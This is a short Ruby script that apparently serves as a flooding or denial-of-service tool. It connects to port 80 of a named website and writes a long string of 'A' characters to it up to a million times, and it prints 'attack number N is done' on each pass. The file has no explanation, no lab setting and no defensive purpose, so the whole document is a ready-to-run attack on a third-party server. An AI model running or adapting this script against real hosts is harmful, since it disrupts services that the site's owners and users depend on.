#!/usr/bin/ruby
require "socket"
include Socket::Constants
begin
	$s = Socket.new(AF_INET,SOCK_STREAM,0)
	$connection = Socket.sockaddr_in(80,"www.aqweeb.com")
	$s.connect($connection)
	for attack in (1..1000000)
		$s.puts("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
		puts "attack number  #{attack} is done"

	end
rescue Exception => e
	puts e.message
ensure
	$s.close if $s
end